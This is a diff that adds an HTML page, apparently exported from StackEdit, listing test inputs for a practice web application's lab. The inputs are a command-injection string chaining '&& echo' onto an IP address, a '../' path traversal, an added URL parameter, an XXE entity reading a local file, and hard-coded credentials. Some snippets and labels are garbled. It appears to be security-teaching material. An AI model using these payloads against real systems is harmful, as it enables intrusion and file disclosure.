@@ -1,0 +1,98 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome file</title>
+    <link rel="stylesheet" href="https://stackedit.io/style.css"/>
+</head>
+
+<body class="stackedit">
+<div class="stackedit__html"><h1 id="command-injection-exploit">1. Command injection exploit</h1>
+    <blockquote>
+        <h3 id="get-the-ip-address-of-the-machine">Get the IP address of the machine</h3>
+        <pre class=" language-cmd"><code class="prism  language-cmd">pconfig | findstr /R /C:"IPv4 Address" &gt; ```  
+</code></pre>
+    </blockquote>
+    <blockquote>
+        <h3 id="fill-input-filed-with-matching-ip-address">Fill input filed with matching IP address</h3>
+        <pre class=" language-text"><code class="prism  language-text">    192.168.1.103 &amp;&amp; echo \"Hello, this is Command injection exploit attack\"  
+</code></pre>
+    </blockquote>
+    <h1 id="path-traversal-for-flag-access">2. Path traversal for flag access</h1>
+    <blockquote>
+        <h3 id="correct">Correct</h3>
+        <pre class=" language-text"><code class="prism  language-text">    info.txt  
+</code></pre>
+    </blockquote>
+    <blockquote>
+        <h3 id="inorrect">Inorrect</h3>
+        <pre class=" language-text"><code class="prism  language-text">    ../Aleksandar/info.txt  
+</code></pre>
+    </blockquote>
+    <h1 id="server-side-request-forgery">3. Server side request forgery</h1>
+    <blockquote>
+        <h3 id="add-to-url">Add to URL</h3>
+        <pre class=" language-text"><code class="prism  language-text">    &amp;Password=true  
+</code></pre>
+    </blockquote>
+    <h1 id="xxe">4. XXE</h1>
+    <blockquote>
+        <h3 id="correct-1">Correct</h3>
+        <pre class=" language-xml"><code class="prism  language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>  
+  
+<span class="token doctype">&lt;!DOCTYPE user [  
+        &lt;!ELEMENT user (info)&gt;</span>  
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span
+                class="token attr-name">info</span> <span class="token attr-name">(#PCDATA)</span><span
+                class="token punctuation">&gt;</span></span>  
+        &lt;!ENTITY xxe SYSTEM "file:///C:/Users/kaoko/Documents/Rider/RBS-Practise/WebApplication1/wwwroot/Data/Aleksandar/info.txt"&gt;  
+        ]&gt;  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span
+        class="token punctuation">&gt;</span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span
+            class="token punctuation">&gt;</span></span><span class="token entity"
+                                                              title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span
+                    class="token tag"><span class="token punctuation">&lt;/</span>info</span><span
+                    class="token punctuation">&gt;</span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span
+        class="token punctuation">&gt;</span></span>  
+</code></pre>
+    </blockquote>
+    <blockquote>
+        <h3 id="inorrect-1">Inorrect</h3>
+        <pre class=" language-xml"><code class="prism  language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>  
+ 
+<span class="token doctype">&lt;!DOCTYPE user [  
+       &lt;!ELEMENT user (info)&gt;</span>  
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span
+               class="token attr-name">info</span> <span class="token attr-name">(#PCDATA)</span><span
+               class="token punctuation">&gt;</span></span>  
+       ]&gt;  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span
+        class="token punctuation">&gt;</span></span>  
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span
+           class="token punctuation">&gt;</span></span>Ja sam Aca.<span class="token tag"><span class="token tag"><span
+                    class="token punctuation">&lt;/</span>info</span><span class="token punctuation">&gt;</span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span
+        class="token punctuation">&gt;</span></span>  
+</code></pre>
+    </blockquote>
+    <h1 id="hard-coded-input">5. Hard coded input</h1>
+    <blockquote>
+        <h3 id="inorrect-2">Inorrect</h3>
+        <pre class=" language-text"><code class="prism  language-text">username: admin  
+password: unsafe  
+</code></pre>
+    </blockquote>
+    <blockquote>
+        <h3 id="correct-2">Correct</h3>
+        <pre class=" language-text"><code class="prism  language-text">username: admin  
+password: safe  
+</code></pre>
+    </blockquote>
+</div>
+</body>
+
+</html>
